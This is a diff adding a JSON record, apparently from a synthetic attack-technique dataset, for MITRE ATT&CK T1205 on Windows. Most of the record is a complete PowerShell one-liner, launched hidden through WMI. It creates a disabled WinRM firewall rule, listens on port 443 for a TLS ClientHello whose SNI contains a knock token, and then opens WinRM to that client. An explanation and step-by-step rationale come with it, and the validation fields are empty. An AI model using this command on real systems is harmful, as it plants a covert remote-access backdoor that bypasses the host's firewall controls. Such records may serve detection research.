@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Enabled False }; $l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,443); $l.Start(); $c=$l.AcceptTcpClient(); $ns=$c.GetStream(); $buf=New-Object byte[] 4096; $n=$ns.Read($buf,0,$buf.Length); $s=[Text.Encoding]::ASCII.GetString($buf,0,$n); if($s -like ''*knock.example.org*''){ $src=$c.Client.RemoteEndPoint.Address.ToString(); Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Enabled True -RemoteAddress $src }; $c.Close(); $l.Stop() }'",
+  "explanation": "Accepts a TCP connection on 443 and inspects the initial ClientHello bytes for an SNI value containing 'knock.example.org' (TLS application signal in cleartext SNI). On match, it enables a WinRM HTTPS firewall rule for that client.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/5986.",
+    "Start a TCP listener on 443 and read the first packet from the client.",
+    "Search for the SNI hostname token and enable the rule for the client IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-1ddefe58",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
